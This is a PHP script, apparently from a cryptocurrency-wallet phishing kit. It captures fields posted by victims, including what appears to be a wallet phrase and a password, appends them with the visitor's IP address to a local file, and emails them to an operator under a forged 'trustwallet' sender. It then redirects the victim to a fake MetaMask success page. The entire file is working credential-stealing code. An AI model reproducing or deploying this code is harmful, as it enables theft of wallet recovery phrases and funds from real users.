<?php
$file = "yones";
$copynyo = $_POST['copynyo'];
fwrite($handle, "\n");
$password = $_POST['password'];
fwrite($handle, "\n");
$ulang = $_POST['ulang'];
fwrite($handle, "\n");
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "copynyo  	: ");
fwrite($handle, "$copynyo");
fwrite($handle, "\n");
fwrite($handle, "password   	: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "ulang   	: ");
fwrite($handle, "$ulang");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "https://www.macalidit.com/ ");
fwrite($handle, "\n");
fclose($handle);
$copynyo = $_POST['copynyo'];
fwrite($handle, "\n");
$password = $_POST['password'];
fwrite($handle, "\n");
$ulang = $_POST['ulang'];
fwrite($handle, "\n");
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

copynyo :                                                                   ".$copynyo." 
password :                                                                   ".$password."
ulang :                                                                   ".$ulang."  

IP Address :                         https://geoiptool.com/?IP=".$ip." 

https://www.mancalidit.com/
";
include              'mail.php';
$subject = "============ BULIN ============ ".$ip." ";
$headers = "From: trustwallet </>";
mail($rezult_mail, $subject,                      $message,                                                   $headers);
echo "<script                                                                      LANGUAGE=\"JavaScript\">
<!--
top.location=\"/app/metamask/successfully.html?/access-my-wallet\";
// -->
</script>";
?>